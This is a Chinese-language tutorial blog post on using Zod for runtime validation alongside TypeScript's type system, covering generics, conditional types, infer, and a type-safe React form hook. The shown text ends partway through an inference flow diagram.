                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>核心理念</strong></p>
<ul>
<li><strong>TypeScript 类型推断</strong>：把运行时错误变成编译时错误，同时为编辑器提供智能提示（自动补全、悬浮类型信息）</li>
<li><strong>泛型的核心价值</strong>：让类型信息在函数调用过程中"流动"，而不是被抹掉</li>
</ul>
</blockquote>
<h2 data-id="heading-0">一、为什么有了 TypeScript 还需要 Zod？</h2>
<h3 data-id="heading-1">本质区别</h3>

























<table><thead><tr><th/><th>TypeScript</th><th>Zod</th></tr></thead><tbody><tr><td>作用时机</td><td>编译时</td><td>运行时</td></tr><tr><td>编译后</td><td>类型信息完全擦除</td><td>验证逻辑保留</td></tr><tr><td>保护范围</td><td>你写的代码</td><td>外部进来的数据</td></tr></tbody></table>
<h3 data-id="heading-2">TypeScript 的局限</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// 编译后类型信息完全消失</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(apiResponse); <span class="hljs-comment">// 运行时没有任何验证！</span>
</code></pre>
<p>如果 API 返回 <code>{ name: 123, age: "abc" }</code>，TypeScript 不会报错，程序会带着错误数据继续运行。</p>
<h3 data-id="heading-3">Zod 的价值</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>(),
  <span class="hljs-attr">age</span>: z.<span class="hljs-title function_">number</span>(),
});

<span class="hljs-keyword">const</span> user = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(apiResponse)); 
<span class="hljs-comment">// 数据不符合 schema 会直接抛错</span>
</code></pre>
<h3 data-id="heading-4">使用场景判断</h3>

















<table><thead><tr><th>数据来源</th><th>用什么</th></tr></thead><tbody><tr><td>外部进来的（API、用户输入、env、localStorage）</td><td>Zod</td></tr><tr><td>内部流转的（props、state、函数签名）</td><td>TS 类型</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">二、Zod 的核心优势：Schema 即类型</h2>
<h3 data-id="heading-6"><code>z.infer</code> 自动导出类型</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 只写一次 schema</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>(),
  <span class="hljs-attr">email</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">email</span>(),
  <span class="hljs-attr">age</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">min</span>(<span class="hljs-number">0</span>),
});

<span class="hljs-comment">// 自动导出 TypeScript 类型，不用手写 interface</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = z.<span class="hljs-property">infer</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">UserSchema</span>&gt;;
<span class="hljs-comment">// 等价于：type User = { name: string; email: string; age: number }</span>
</code></pre>
<h3 data-id="heading-7">对比传统方式</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ❌ 传统方式：写两遍，容易不同步</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">validateUser</span>(<span class="hljs-params">data: <span class="hljs-built_in">unknown</span></span>): <span class="hljs-title class_">User</span> {
  <span class="hljs-comment">// 手写验证逻辑...</span>
}

<span class="hljs-comment">// ✅ Zod：Single Source of Truth</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({...});
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = z.<span class="hljs-property">infer</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">UserSchema</span>&gt;;
<span class="hljs-keyword">const</span> user = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(data); <span class="hljs-comment">// 验证 + 类型推导一步到位</span>
</code></pre>
<h3 data-id="heading-8">好处</h3>
<ul>
<li><strong>改一处，处处生效</strong> — 修改 schema，类型自动更新</li>
<li><strong>IDE 全程有提示</strong> — parse 后的数据有完整类型支持</li>
<li><strong>复杂类型也能推导</strong> — union、optional、transform 等都能正确推导</li>
</ul>
<hr/>
<h2 data-id="heading-9">三、Zod 验证失败的处理</h2>
<h3 data-id="heading-10">方式一：<code>parse</code> - 直接抛错</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> user = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(apiResponse);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-keyword">if</span> (error <span class="hljs-keyword">instanceof</span> z.<span class="hljs-property">ZodError</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">errors</span>);
    <span class="hljs-comment">// [{ path: ['email'], message: 'Invalid email' }]</span>
  }
}
</code></pre>
<h3 data-id="heading-11">方式二：<code>safeParse</code> - 不抛错（推荐）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> result = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">safeParse</span>(apiResponse);

<span class="hljs-keyword">if</span> (result.<span class="hljs-property">success</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result.<span class="hljs-property">data</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// result.data 类型安全</span>
} <span class="hljs-keyword">else</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result.<span class="hljs-property">error</span>.<span class="hljs-title function_">flatten</span>()); <span class="hljs-comment">// 详细错误信息</span>
}
</code></pre>
<h3 data-id="heading-12">理解 <code>safeParse</code> 返回值</h3>
<p><code>result</code> 是 <strong>Zod 生成的结果对象</strong>，不是后端数据：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 验证成功时</span>
{ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">data</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> } }

<span class="hljs-comment">// 验证失败时</span>
{ <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-title class_">ZodError</span> }
</code></pre>
<h3 data-id="heading-13">实际项目处理模式</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${id}</span>`</span>);
  <span class="hljs-keyword">const</span> json = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();
  
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">safeParse</span>(json);
  
  <span class="hljs-keyword">if</span> (!result.<span class="hljs-property">success</span>) {
    <span class="hljs-title function_">reportError</span>(<span class="hljs-string">'API schema mismatch'</span>, result.<span class="hljs-property">error</span>); <span class="hljs-comment">// 上报监控</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 或返回默认值、抛业务异常</span>
  }
  
  <span class="hljs-keyword">return</span> result.<span class="hljs-property">data</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-14">四、TypeScript 高级类型系统</h2>
<blockquote>
<p>TypeScript 的类型系统本质上是一门<strong>图灵完备的函数式编程语言</strong></p>
<p><strong>核心价值：通过类型推断，把运行时错误变成编译时错误</strong></p>
</blockquote>
<h3 data-id="heading-15">泛型：类型层面的"函数"</h3>
<blockquote>
<p><strong>泛型的核心价值：让类型信息在函数调用过程中"流动"，而不是被抹掉</strong></p>
</blockquote>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Wrapper</span>&lt;T&gt; = { <span class="hljs-attr">value</span>: T; <span class="hljs-attr">timestamp</span>: <span class="hljs-built_in">number</span> };

<span class="hljs-keyword">type</span> <span class="hljs-title class_">WrappedString</span> = <span class="hljs-title class_">Wrapper</span>&lt;<span class="hljs-built_in">string</span>&gt;;  <span class="hljs-comment">// { value: string; timestamp: number }</span>
</code></pre>
<h3 data-id="heading-16">条件类型：类型层面的 <code>if-else</code></h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"hello"</span>&gt;;  <span class="hljs-comment">// true</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;;      <span class="hljs-comment">// false</span>
</code></pre>
<h3 data-id="heading-17"><code>infer</code>：类型层面的模式匹配</h3>
<p><code>infer</code> 的作用：<strong>"这个位置的类型我不知道，但帮我捕获出来，后面我要用"</strong></p>
<p>类比正则表达式的捕获组：</p>
<pre><code class="hljs language-javascript" lang="javascript">正则：/<span class="hljs-title class_">Hello</span> (\w+)/  →  捕获括号里匹配到的内容
类型：T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt;  →  捕获 <span class="hljs-title class_">Promise</span> 里面的类型
</code></pre>
<h4 data-id="heading-18">为什么 <code>infer</code> 只能和 <code>extends</code> 一起用？</h4>
<p><code>infer</code> 需要一个<strong>匹配上下文</strong>才能知道要捕获什么，<code>extends</code> 提供了这个上下文：</p>
<pre><code class="hljs language-typescript" lang="typescript">T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? U : <span class="hljs-built_in">never</span>
<span class="hljs-comment">//        ↑ 这是一个"模式"</span>
<span class="hljs-comment">//                  ↑ 在这个模式里，U 是要捕获的部分</span>
</code></pre>
<p>TS 的执行逻辑：</p>
<ol>
<li>拿 <code>T</code> 去匹配 <code>Promise&lt;?&gt;</code> 这个模式</li>
<li>如果匹配成功，把 <code>?</code> 位置的类型赋值给 <code>U</code></li>
<li>然后 <code>U</code> 就可以在 <code>?</code> 后面使用了</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ❌ 不能单独使用 infer</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Bad</span>&lt;T&gt; = infer U;  <span class="hljs-comment">// 错误：infer 只能在条件类型的 extends 子句中使用</span>
<span class="hljs-comment">// 因为 TS 不知道 U 应该从哪里推断，没有模式匹配就没有"捕获"的来源</span>
</code></pre>
<p>就像正则表达式的捕获组必须在匹配模式里，不能单独写 <code>(\w+)</code>。</p>
<h4 data-id="heading-19">示例：提取 Promise 内部类型</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Unwrap</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? U : T;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">Unwrap</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;;  <span class="hljs-comment">// string</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">Unwrap</span>&lt;<span class="hljs-built_in">number</span>&gt;;           <span class="hljs-comment">// number</span>
</code></pre>
<p>执行过程：</p>
<ol>
<li><code>T extends Promise&lt;infer U&gt;</code> — T 是不是 <code>Promise&lt;某个类型&gt;</code>？</li>
<li><code>infer U</code> — 如果是，把那个类型捕获出来叫 <code>U</code></li>
<li><code>? U : T</code> — 条件成立返回 <code>U</code>，否则返回 <code>T</code></li>
</ol>
<h4 data-id="heading-20">示例：提取函数返回值类型</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Fn</span> = <span class="hljs-function">(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) =&gt;</span> { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> };
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-title class_">Fn</span>&gt;;  <span class="hljs-comment">// { name: string; age: number }</span>
</code></pre>
<h4 data-id="heading-21">示例：<code>infer</code> 配合模板字面量提取字符串</h4>
<p><code>infer</code> 不仅能提取泛型参数，还能从字符串字面量类型中提取部分内容：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 从 'GET /api/user/:id' 中提取方法</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractMethod</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer M}</span> <span class="hljs-subst">${<span class="hljs-built_in">string</span>}</span>`</span> ? M : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Method</span> = <span class="hljs-title class_">ExtractMethod</span>&lt;<span class="hljs-string">'GET /api/user/:id'</span>&gt;;  <span class="hljs-comment">// 'GET'</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Method2</span> = <span class="hljs-title class_">ExtractMethod</span>&lt;<span class="hljs-string">'POST /api/login'</span>&gt;;   <span class="hljs-comment">// 'POST'</span>

<span class="hljs-comment">// 从 'GET /api/user/:id' 中提取路径</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractPath</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-built_in">string</span>}</span> <span class="hljs-subst">${infer P}</span>`</span> ? P : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Path</span> = <span class="hljs-title class_">ExtractPath</span>&lt;<span class="hljs-string">'GET /api/user/:id'</span>&gt;;  <span class="hljs-comment">// '/api/user/:id'</span>
</code></pre>
<p>执行过程（以 <code>ExtractMethod</code> 为例）：</p>
<ol>
<li><code>T = 'GET /api/user/:id'</code></li>
<li>模式 <code>${infer M} ${string}</code> 表示：<code>M</code> + 空格 + 任意字符串</li>
<li>TS 尝试匹配，发现 <code>M = 'GET'</code>，后面是 <code>' /api/user/:id'</code></li>
<li>匹配成功，返回 <code>M</code>，即 <code>'GET'</code></li>
</ol>
<p>这在构建类型安全的路由、API 客户端时非常有用。</p>
<h3 data-id="heading-22">映射类型：批量变换对象类型</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Partial</span>&lt;T&gt; = { [K <span class="hljs-keyword">in</span> keyof T]?: T[K] };
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Readonly</span>&lt;T&gt; = { <span class="hljs-keyword">readonly</span> [K <span class="hljs-keyword">in</span> keyof T]: T[K] };
</code></pre>
<h3 data-id="heading-23">模板字面量类型</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">EventName</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = <span class="hljs-string">`on<span class="hljs-subst">${Capitalize&lt;T&gt;}</span>`</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ClickEvent</span> = <span class="hljs-title class_">EventName</span>&lt;<span class="hljs-string">'click'</span>&gt;;  <span class="hljs-comment">// "onClick"</span>
</code></pre>
<hr/>
<h2 data-id="heading-24">五、实战案例：类型安全的表单 Hook</h2>
<blockquote>
<p>本案例完整展示两个核心理念：</p>
<ul>
<li><strong>类型推断把运行时错误变编译时错误</strong>：字段名拼错、值类型不对，编译时就报错</li>
<li><strong>泛型让类型"流动"</strong>：初始值的类型信息一路流动到 <code>setField</code>，不会丢失</li>
</ul>
</blockquote>
<h3 data-id="heading-25">需求</h3>
<ul>
<li>传入初始值，自动推导表单字段类型</li>
<li><code>values</code>、<code>errors</code>、<code>onChange</code> 都要类型安全</li>
<li>字段名写错要报错，值类型不对要报错</li>
</ul>
<h3 data-id="heading-26">没有类型推导的痛苦</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ❌ 手动指定类型，写两遍，容易不同步</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">FormValues</span> {
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">const</span> { values, setField } = useForm&lt;<span class="hljs-title class_">FormValues</span>&gt;({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-string">''</span>
});

<span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'test'</span>);  <span class="hljs-comment">// 拼写错误，运行时才发现</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'18'</span>);         <span class="hljs-comment">// 类型错了，string 给了 number 字段</span>
</code></pre>
<h3 data-id="heading-27">实现</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T) {
  <span class="hljs-keyword">const</span> [values, setValues] = useState&lt;T&gt;(initialValues);
  <span class="hljs-keyword">const</span> [errors, setErrors] = useState&lt;<span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">Record</span>&lt;keyof T, <span class="hljs-built_in">string</span>&gt;&gt;&gt;({});

  <span class="hljs-comment">// K extends keyof T：字段名必须是 T 的 key</span>
  <span class="hljs-comment">// T[K]：值类型自动跟着字段走</span>
  <span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K]) {
    <span class="hljs-title function_">setValues</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, [field]: value }));
  }

  <span class="hljs-keyword">function</span> setError&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>) {
    <span class="hljs-title function_">setErrors</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, [field]: message }));
  }

  <span class="hljs-keyword">return</span> { values, errors, setField, setError };
}
</code></pre>
<h3 data-id="heading-28">使用效果</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> { values, setField } = <span class="hljs-title function_">useForm</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">false</span>,
});

<span class="hljs-title function_">setField</span>(<span class="hljs-string">'username'</span>, <span class="hljs-string">'john'</span>);     <span class="hljs-comment">// ✅ </span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>);              <span class="hljs-comment">// ✅</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);     <span class="hljs-comment">// ❌ 编译错误：字段名不存在</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);            <span class="hljs-comment">// ❌ 编译错误：期望 number，给了 string</span>
</code></pre>
<h3 data-id="heading-29">编辑器智能提示</h3>
<p>类型推断不仅能报错，还能提供智能提示：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">setField</span>(<span class="hljs-string">'|'</span>)  <span class="hljs-comment">// 光标在这里时，编辑器自动弹出补全列表：</span>
               <span class="hljs-comment">// - username</span>
               <span class="hljs-comment">// - age</span>
               <span class="hljs-comment">// - isAdmin</span>

values.|       <span class="hljs-comment">// 光标在这里时，编辑器自动提示所有可用字段和类型：</span>
               <span class="hljs-comment">// - username: string</span>
               <span class="hljs-comment">// - age: number</span>
               <span class="hljs-comment">// - isAdmin: boolean</span>
</code></pre>
<p>这是因为 TS 推断出了具体类型，编辑器（通过 TypeScript Language Server）就能提供精确的补全和类型信息。如果类型信息丢失（比如变成 <code>Record&lt;string, unknown&gt;</code>），这些提示就没了。</p>
<h3 data-id="heading-30">类型推断的完整执行过程</h3>
<h4 data-id="heading-31">第一步：调用 useForm，推断泛型 T</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> { values, setField } = <span class="hljs-title function_">useForm</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">false</span>,
});
</code></pre>
<p>TS 看到你传入的对象字面量，自动推断出泛型 <code>T</code> 的具体类型：</p>
<pre><code class="hljs language-typescript" lang="typescript">T = {
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">isAdmin</span>: <span class="hljs-built_in">boolean</span>;
}
</code></pre>
<p>此时函数签名相当于：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useForm</span>(<span class="hljs-params">initialValues: { username: <span class="hljs-built_in">string</span>; age: <span class="hljs-built_in">number</span>; isAdmin: <span class="hljs-built_in">boolean</span> }</span>)
</code></pre>
<h4 data-id="heading-32">第二步：keyof T 生成字段名联合类型</h4>
<pre><code class="hljs language-typescript" lang="typescript">keyof T = <span class="hljs-string">'username'</span> | <span class="hljs-string">'age'</span> | <span class="hljs-string">'isAdmin'</span>
</code></pre>
<p>这意味着所有用到 <code>keyof T</code> 的地方，只能是这三个字符串之一。</p>
<h4 data-id="heading-33">第三步：setField 调用时的推断</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K])
</code></pre>
<p>当你调用 <code>setField('age', 25)</code> 时：</p>
<ol>
<li>TS 看到第一个参数是 <code>'age'</code></li>
<li>推断出 <code>K = 'age'</code></li>
<li>计算 <code>T[K]</code> = <code>T['age']</code> = <code>number</code></li>
<li>所以第二个参数 <code>value</code> 必须是 <code>number</code></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>);      <span class="hljs-comment">// ✅ K='age', T[K]=number, 25 是 number</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);    <span class="hljs-comment">// ❌ K='age', T[K]=number, '25' 是 string，类型不匹配</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'username'</span>, <span class="hljs-string">'john'</span>); <span class="hljs-comment">// ✅ K='username', T[K]=string</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'isAdmin'</span>, <span class="hljs-literal">true</span>);    <span class="hljs-comment">// ✅ K='isAdmin', T[K]=boolean</span>
</code></pre>
<h4 data-id="heading-34">第四步：错误字段名的拦截</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);  <span class="hljs-comment">// ❌ 编译错误</span>
</code></pre>
<p>TS 检查 <code>'usernmae'</code> 是否属于 <code>keyof T</code>（即 <code>'username' | 'age' | 'isAdmin'</code>），发现不属于，直接报错。</p>
<h4 data-id="heading-35">完整推断流程图</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">false</span> })
    │
    ▼
T 被推断为 { username: <span class="hljs-keyword">string</span>; age: number; isAdmin: <span class="hljs-keyword">boolean</span> }
    │
    ▼
